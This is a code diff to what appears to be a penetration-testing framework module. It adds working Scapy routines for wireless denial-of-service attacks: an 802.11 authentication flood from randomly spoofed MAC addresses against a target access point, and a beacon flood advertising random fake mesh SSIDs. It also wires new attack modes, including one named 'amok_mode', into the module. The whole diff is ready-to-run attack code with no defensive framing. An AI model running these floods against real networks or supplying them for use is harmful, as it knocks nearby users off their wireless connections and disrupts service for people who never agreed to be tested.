@@ -106,6 +106,67 @@ class Exploit(Exploit):
 
         print_success("EAPOL-Start flood: {} frames sent.".format(sent))
 
+    def _scapy_auth_flood(self) -> None:
+        """Flood 802.11 Open Auth frames from random MACs via Scapy."""
+        try:
+            from scapy.all import RadioTap, Dot11, Dot11Auth, sendp
+        except ImportError:
+            print_error("Scapy is required for auth_flood.")
+            return
+
+        target = str(self.target_bssid).strip() if self.target_bssid else "ff:ff:ff:ff:ff:ff"
+        delay = 1.0 / max(int(self.speed), 1)
+        end_time = time.time() + self.duration if self.duration > 0 else float("inf")
+        sent = 0
+        print_status("Auth flood (Scapy): {} -> {}  {:.0f} fps  {}s".format(
+            self.interface, target, self.speed,
+            self.duration if self.duration > 0 else "∞"))
+        try:
+            while time.time() < end_time:
+                src = ":".join("{:02x}".format(random.randint(0, 255)) for _ in range(6))
+                pkt = (RadioTap() /
+                       Dot11(type=0, subtype=11,
+                             addr1=target, addr2=src, addr3=target) /
+                       Dot11Auth(algo=0, seqnum=1, status=0))
+                sendp(pkt, iface=self.interface, verbose=False)
+                sent += 1
+                if delay > 0:
+                    time.sleep(delay)
+        except KeyboardInterrupt:
+            pass
+        print_success("Auth flood: {} frames sent.".format(sent))
+
+    def _scapy_mesh_flood(self) -> None:
+        """Flood 802.11s Mesh Beacon frames via Scapy."""
+        try:
+            from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
+        except ImportError:
+            print_error("Scapy is required for mesh_flood.")
+            return
+
+        delay = 1.0 / max(int(self.speed), 1)
+        end_time = time.time() + self.duration if self.duration > 0 else float("inf")
+        sent = 0
+        print_status("Mesh flood (Scapy): {} {}s".format(self.interface,
+            self.duration if self.duration > 0 else "∞"))
+        try:
+            while time.time() < end_time:
+                src = ":".join("{:02x}".format(random.randint(0, 255)) for _ in range(6))
+                ssid = "mesh-{:04x}".format(random.randint(0, 0xFFFF))
+                pkt = (RadioTap() /
+                       Dot11(type=0, subtype=8,
+                             addr1="ff:ff:ff:ff:ff:ff", addr2=src, addr3=src) /
+                       Dot11Beacon(cap=0x0421) /
+                       Dot11Elt(ID="SSID", info=ssid) /
+                       Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96"))
+                sendp(pkt, iface=self.interface, verbose=False)
+                sent += 1
+                if delay > 0:
+                    time.sleep(delay)
+        except KeyboardInterrupt:
+            pass
+        print_success("Mesh flood: {} frames sent.".format(sent))
+
     def _scapy_cts_flood(self) -> None:
         """Flood CTS frames to reserve channel time (NAV attack)."""
         try:
@@ -205,5 +266,9 @@ class Exploit(Exploit):
             self._scapy_eapol_flood()
         elif self.mode == "cts_nav":
             self._scapy_cts_flood()
+        elif self.mode in ("auth_flood", "amok_mode"):
+            self._scapy_auth_flood()
+        elif self.mode == "mesh_flood":
+            self._scapy_mesh_flood()
         else:
             print_info("For {} mode with scapy backend, use mdk4 instead.".format(self.mode))
